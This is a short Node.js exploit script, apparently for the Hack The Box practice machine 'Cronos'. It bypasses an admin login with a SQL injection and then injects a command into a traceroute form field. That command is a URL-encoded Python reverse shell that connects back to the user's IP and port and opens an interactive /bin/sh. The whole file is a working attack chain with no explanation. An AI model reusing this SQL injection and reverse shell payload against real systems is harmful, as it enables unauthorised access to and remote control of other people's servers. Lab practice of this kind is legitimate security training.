// npm install xmlhttprequest
console.log("add admin.cronos.htb to hosts\nusage: nodejs cronos.js <your_ip> <your_port>");
var args = process.argv.slice(2);
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://admin.cronos.htb" , true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("username=admin%27+or+%271%27%3D%271&password=asd");

xhr.open("POST", "http://admin.cronos.htb/welcome.php" , true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("command=traceroute&host=8.8.8.8%3B+python+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22"+args[0]+"%22%2C"+args[1]+"%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27");
